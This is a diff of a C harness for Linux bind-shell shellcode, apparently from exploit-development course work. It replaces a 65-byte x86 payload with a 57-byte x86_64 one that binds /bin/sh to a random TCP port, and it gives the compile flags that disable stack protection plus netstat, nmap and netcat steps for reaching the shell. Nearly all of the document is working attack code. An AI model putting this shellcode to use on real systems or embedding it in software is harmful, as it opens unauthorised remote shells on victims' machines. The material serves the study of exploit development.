@@ -1,83 +1,77 @@
 /*
 
- Shell Bind TCP Random Port Shellcode - C Language
- Linux/x86
-
- Written in 2013 by Geyslan G. Bem, Hacking bits
+ Shell Bind TCP Random Port Shellcode - C Language - Linux/x86_64
+ Copyright (C) 2013 Geyslan G. Bem, Hacking bits
 
    http://hackingbits.com
    geyslan@gmail.com
 
- With the great support from Tiago Natel, Sec Plus
+ This program is free software: you can redistribute it and/or modify
+ it under the terms of the GNU General Public License as published by
+ the Free Software Foundation, either version 3 of the License, or
+ (at your option) any later version.
 
-   http://www.secplus.com.br/
-   tiago4orion@gmail.com
+ This program is distributed in the hope that it will be useful,
+ but WITHOUT ANY WARRANTY; without even the implied warranty of
+ MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ GNU General Public License for more details.
 
- This source is licensed under the Creative Commons
- Attribution-ShareAlike 3.0 Brazil License.
-
- To view a copy of this license, visit
-
-   http://creativecommons.org/licenses/by-sa/3.0/
-
- You are free:
-
-    to Share - to copy, distribute and transmit the work
-    to Remix - to adapt the work
-    to make commercial use of the work
-
- Under the following conditions:
-   Attribution - You must attribute the work in the manner
-                 specified by the author or licensor (but
-                 not in any way that suggests that they
-                 endorse you or your use of the work).
-
-   Share Alike - If you alter, transform, or build upon
-                 this work, you may distribute the
-                 resulting work only under the same or
-                 similar license to this one.
+ You should have received a copy of the GNU General Public License
+ along with this program.  If not, see <http://www.gnu.org/licenses/>
 
 */
+
 
 /*
 
- shell_bind_tcp_random_port_shellcode
+   shell_bind_tcp_random_port_shellcode_x86_64
+     assembly source: https://github.com/geyslan/SLAE/blob/master/improvements/shell_bind_tcp_random_port_x86_64.asm
 
- * 65 bytes
- * null-bytes free
- * the port number is set by the system and can be discovered using nmap
-   (see http://manuals.ts.fujitsu.com/file/4686/posix_s.pdf, page 23, section 2.6.6)
+   * 57 bytes
+   * null-free
 
 
- # gcc -m32 -fno-stack-protector -z execstack shell_bind_tcp_random_port_shellcode.c -o shell_bind_tcp_random_port_shellcode
- # ./shell_bind_tcp_random_port_shellcode
+   # gcc -m64 -fno-stack-protector -z execstack shell_bind_tcp_random_port_shellcode_x86_64.c -o shell_bind_tcp_random_port_shellcode_x86_64
 
- Testing
- # netstat -anp | grep shell
- # nmap -sS 127.0.0.1 -p-  (It's necessary to use the TCP SYN scan option [-sS]; thus avoids that nmap connects to the port open by shellcode)
- # nc 127.0.0.1 port
+   Testing
+   # ./shell_bind_tcp_random_port_shellcode_x86_64
+   # netstat -anp | grep shell
+   # nmap -sS 127.0.0.1 -p-  (It's necessary to use the TCP SYN scan option [-sS]; thus avoids that nmap connects to the port open by shellcode)
+   # nc 127.0.0.1 port
 
 */
+
 
 #include <stdio.h>
 #include <string.h>
 
 unsigned char code[] = \
 
-"\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89"
-"\xe1\xcd\x80\x89\xc6\x5f\xb0\x66\xb3\x04\x52\x56"
-"\x89\xe1\xcd\x80\xb0\x66\x43\x89\x54\x24\x08\xcd"
-"\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b"
-"\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
-"\xe3\x52\x53\xeb\xca";
+"\x48\x31\xf6\x48\xf7\xe6\xff\xc6\x6a\x02"
+"\x5f\xb0\x29\x0f\x05\x52\x5e\x50\x5f\xb0"
+"\x32\x0f\x05\xb0\x2b\x0f\x05\x57\x5e\x48"
+"\x97\xff\xce\xb0\x21\x0f\x05\x75\xf8\x52"
+"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
+"\x57\x54\x5f\xb0\x3b\x0f\x05";
 
 main ()
 {
 
-	printf("Shellcode Length:  %d\n", strlen(code));
+    // When contains null bytes, printf will show a wrong shellcode length.
 
-	int (*ret)() = (int(*)())code;
+    printf("Shellcode Length:  %d\n", strlen(code));
 
-	ret();
+    // Pollutes all registers ensuring that the shellcode runs in any circumstance.
+
+    __asm__ ("mov $0xffffffffffffffff, %rax\n\t"
+         "mov %rax, %rbx\n\t"
+         "mov %rax, %rcx\n\t"
+         "mov %rax, %rdx\n\t"
+         "mov %rax, %rsi\n\t"
+         "mov %rax, %rdi\n\t"
+         "mov %rax, %rbp\n\t"
+
+    // Calling the shellcode
+         "call code");
 
 }
